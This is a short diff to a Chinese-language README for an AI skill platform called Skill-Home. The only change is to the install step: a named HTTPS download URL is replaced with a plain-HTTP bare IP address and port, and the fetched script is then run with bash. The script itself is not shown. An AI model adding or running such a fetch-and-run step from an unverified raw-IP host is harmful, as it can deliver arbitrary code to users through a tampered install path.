@@ -16,7 +16,7 @@ Skill-Home 是一个完整的 AI Skill 生态系统，包含：
 
 ```bash
 # 1. 安装 CLI
-curl -fsSL https://get.skill-home.dev/install.sh -o /tmp/skill-home-install.sh
+curl -fsSL http://47.122.112.210:8080/install.sh -o /tmp/skill-home-install.sh
 bash /tmp/skill-home-install.sh
 
 # 2. 注册账号
